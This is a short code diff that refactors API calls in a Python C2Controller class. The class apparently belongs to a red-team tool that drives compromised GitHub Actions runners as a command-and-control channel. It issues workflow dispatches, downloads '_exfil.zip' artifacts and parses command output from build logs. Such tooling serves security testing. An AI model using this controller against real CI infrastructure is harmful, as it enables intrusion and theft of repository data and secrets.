@@ -55,7 +55,7 @@ class C2Controller:
             c2_repo = f"{username}/{c2_repo}"
 
         # Get available runners
-        runners = await self.api.get_repo_runners(c2_repo)
+        runners = await self.api.action.get_repo_runners(c2_repo)
         if not runners:
             Output.error("No runners connected to C2 repository!")
             return False
@@ -182,7 +182,7 @@ class C2Controller:
         curr_time = WebShellUtils.get_current_timestamp()
 
         # Issue the dispatch
-        success = await self.api.issue_dispatch(
+        success = await self.api.action.issue_dispatch(
             c2_repo,
             target_workflow=workflow_name,
             target_branch="main",
@@ -231,7 +231,7 @@ class C2Controller:
 
     async def _handle_download_result(self, c2_repo: str, workflow_id: int):
         """Handle file download result."""
-        dest = await self.api.download_workflow_artifact(
+        dest = await self.api.action.download_workflow_artifact(
             c2_repo, workflow_id, f"{str(workflow_id)}_exfil.zip"
         )
 
@@ -242,7 +242,9 @@ class C2Controller:
 
     async def _handle_command_output(self, c2_repo: str, workflow_id: int):
         """Handle command output parsing."""
-        runlog = await self.api.retrieve_workflow_log(c2_repo, workflow_id, "build")
+        runlog = await self.api.action.retrieve_workflow_log(
+            c2_repo, workflow_id, "build"
+        )
 
         if not runlog:
             Output.error("Unable to retrieve workflow log!")
@@ -268,7 +270,7 @@ class C2Controller:
 
     async def list_runners(self, c2_repo: str):
         """Lists all runners connected to the C2 repository."""
-        runners = await self.api.get_repo_runners(c2_repo)
+        runners = await self.api.action.get_repo_runners(c2_repo)
 
         if not runners:
             Output.error("No runners connected to C2 repository!")
